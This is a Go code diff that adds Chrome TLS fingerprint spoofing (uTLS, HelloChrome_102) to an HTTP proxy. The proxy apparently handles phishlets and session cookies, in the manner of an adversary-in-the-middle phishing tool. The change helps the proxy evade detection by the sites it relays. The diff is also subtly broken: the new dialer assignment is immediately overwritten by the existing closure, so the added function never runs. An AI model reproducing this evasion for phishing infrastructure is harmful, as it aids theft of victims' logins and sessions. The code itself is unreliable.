@@ -143,6 +143,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		}
 	}
 
+	// Set uTLS dialer to mimic Chrome TLS fingerprint
+	p.Proxy.Tr.DialTLSContext = p.utlsDialContext
+
 	// uTLS Fingerprint spoofing setup
 	p.Proxy.Tr.DialTLSContext = func(ctx context.Context, network, addr string) (net.Conn, error) {
 		// Use the configured dialer if a proxy is set, otherwise use the default dialer
@@ -2057,4 +2060,43 @@ func getSessionCookieName(pl_name string, cookie_name string) string {
 	s_hash := fmt.Sprintf("%x", hash[:4])
 	s_hash = s_hash[:4] + "-" + s_hash[4:]
 	return s_hash
+}
+
+// utlsDialContext creates a TLS connection using uTLS to mimic Chrome browser
+func (p *HttpProxy) utlsDialContext(ctx context.Context, network, addr string) (net.Conn, error) {
+	host, _, err := net.SplitHostPort(addr)
+	if err != nil {
+		host = addr
+		addr = net.JoinHostPort(host, "443")
+	}
+
+	// Dial TCP connection
+	var conn net.Conn
+	if p.Proxy.Tr.DialContext != nil {
+		conn, err = p.Proxy.Tr.DialContext(ctx, network, addr)
+	} else {
+		d := net.Dialer{}
+		conn, err = d.DialContext(ctx, network, addr)
+	}
+	if err != nil {
+		return nil, err
+	}
+
+	// Create uTLS config
+	config := &utls.Config{
+		ServerName:         host,
+		InsecureSkipVerify: false,
+	}
+
+	// Create uTLS client mimicking Chrome
+	uConn := utls.UClient(conn, config, utls.HelloChrome_102)
+
+	// Handshake
+	err = uConn.Handshake()
+	if err != nil {
+		conn.Close()
+		return nil, err
+	}
+
+	return uConn, nil
 }
